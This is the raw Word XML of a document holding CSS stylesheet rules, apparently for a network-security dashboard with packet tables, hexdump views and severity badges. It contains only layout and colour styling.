    <w:p w14:paraId="1792CE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.metric-meta .state-dot {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760DBF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width: 6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087175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height: 6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B73DB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border-radius: 50%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C7AF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var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3294A0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ADA7F37" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B4F14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.metric-meta.alert .state-dot {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DC1D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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6AA57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C5A0A6F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="554F46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.chart-container {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4F7D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height: 48px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8BA6E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margin-top: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018E99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69FC1B5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49D72C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.overview-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE33BD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grid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7A91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grid-template-columns: minmax(0, 2fr) minmax(280px, 0.82fr);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3A12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gap: 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DB8B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align-items: start;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E8E19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C6D67CF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C34299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.overview-grid table {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582C8B4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min-width: 640px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE8F61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734D5FF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="710280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.table-card {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F8AD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var(--bg-card);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2F606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 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3692BA6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border-radius: 9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3605802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box-shadow: var(--shadow-sm);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C11E1E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overflow: hidden;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251472A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1C7F1D54" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5394DCE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.table-header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10EA9A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15px 18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="134455E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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9F255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#ffffff !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5767CE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border-bottom: 1px solid var(--border-color) !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447451C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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D73177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650;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0357081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CDE437B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35CF997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.table-header-split {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783ED3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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5139F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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5028A8C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justify-content: space-between;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E0503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gap: 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3271E0A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5C3AFD2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F3CE6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.table-kicker {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E68721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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37ED16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margin-top: 3px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D88C16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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226F58E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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B1F4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400;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A008BC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1FE81F1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BCBED0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.table-scroll {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5951877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width: 100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C6397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overflow: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9874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5AC22A1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77B9521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table {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8EB01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min-width: 760px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C055E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4F81B29" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D36B63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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F8DF9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padding: 10px 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A5FFD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#75828c;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F53C0A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#fafbfc;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B139F3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border-bottom: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ACED5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9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BDA7F4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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3852CF5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letter-spacing: 0.07em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE92E1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1B9B3C39" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D620B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td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256CBBE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12px 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5771585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#33414c;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32580AF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border-bottom: 1px solid #edf0f2;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76AA0A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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7455A67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line-height: 1.45;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DFBA3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5F860A4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04A073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tbody tr:last-child td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A7831F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border-bottom: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10220B7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51E2D7F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71C418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.empty-state {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ADEB6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34px 20px !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1116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#65757b;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3388E4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text-align: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A2421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#fbfcfc;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CCEEF2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9B9BA36" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="352953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.empty-state strong {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D7823D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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5502D49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margin-bottom: 5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A303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#34464d;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C31F6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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689993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600;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AD4BF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1486F25" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72DC903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.empty-state span {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1294990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#7b898e;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BF19F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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6354586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5D00CF5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="098DEC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tr:hover td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C6CC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#f8fafb;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="798D645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04FEC06" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="551E6A7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.mono,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE7FB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.wireshark-row,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B1D36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.pkt-chip,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410740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.hexdump {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E38B5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font-family: "SFMono-Regular", Consolas, "Liberation Mono", monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709554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BEA5CCE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58F71E1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.badge {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B49DDE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inline-flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD2AB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min-width: 54px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0389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justify-content: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB0D27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4px 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3086F56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border-radius: 4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44811F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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A4215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letter-spacing: 0.05em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA0CF0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332AB50" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69E2F4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.bg-CRITICAL {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C133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#9f2f3c;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08DF10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#fbeff1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708E9CA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border-color: #efcbd0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1C7F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2477FFF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C06184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.bg-HIGH {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00DE2FF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#8c570f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E1E35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#fdf5e9;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DBD36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border-color: #ecd5b5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464913D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C8A2220" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A4C175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.bg-SCAN {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342940C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#5c4f85;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA7AF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#f1eff7;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F7F56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border-color: #d7d1e8;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078DBEF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3E3E810" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="394AA1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.bg-INFO {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F33D5F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#245b71;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A389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#edf5f7;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E3510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border-color: #c9dfe6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A8898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1B201C7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24FAE6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.engine-panel {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4858EB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0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165154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overflow: hidden;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492CD2A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79AB533" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65263F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.engine-list {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075F8A9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4px 18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7753877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A8088D7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="100E8B5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.engine-row {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1903EC9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grid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4697EC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grid-template-columns: 9px 1fr auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D595C5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gap: 10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783968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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7934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15px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD9B4D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border-bottom: 1px solid #edf0f2;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63FC522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1E8BA7F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38477E8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.engine-row:last-child {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CE5D4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border-bottom: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDC80B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243FC12" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="652A32E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.engine-marker {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EEFA5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width: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9EBB5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height: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6685654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border-radius: 2px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268B0D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var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9247B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9D4F065" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29173B2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.engine-marker.red { background: var(--accent-red); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B44B5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.engine-marker.orange { background: var(--accent-orange); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160194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.engine-marker.purple { background: var(--accent-purple); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A471CB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20AE6EA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.engine-name {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED905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#293640;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46BB3FA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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188584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600;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553B908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92493C9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B4672D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.engine-model {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18AF8B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margin-top: 3px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2195E2F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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E303E3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9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCEED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C806301" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64630B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.engine-count {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CBB3F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#26333d;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC3126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font-family: "SFMono-Regular", Consolas, monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A5917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17px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCA8E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600;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48BDF9B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B20D9F0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76558F7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.page-intro {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6DF32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margin-bottom: 22px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5415925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A9C8493" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4196DB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.page-intro h2 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536572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 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F3D7C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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AAE60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19px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0547A5D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650;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B1CF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letter-spacing: -0.015em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488247A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903D757" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3369003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.page-intro p {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3B29F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max-width: 720px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC66BC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 6px 0 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D20C8B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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DC018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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7D82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line-height: 1.55;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FC851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C8A70E9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="661A85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.pkt-toolbar {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22776DD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gap: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABD15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margin-bottom: 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F2F9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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E540EC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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C83E3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 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72078D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border-radius: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DA0E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166B6620" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3139856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.pkt-toolbar input[type="text"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06BEDD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.pkt-toolbar select,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6341ED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.pkt-btn {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7343083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min-height: 34px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9F4FE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7px 10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C9C2B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#33414b;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3F9FF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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E8135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 1px solid #ccd4da;</w:t>
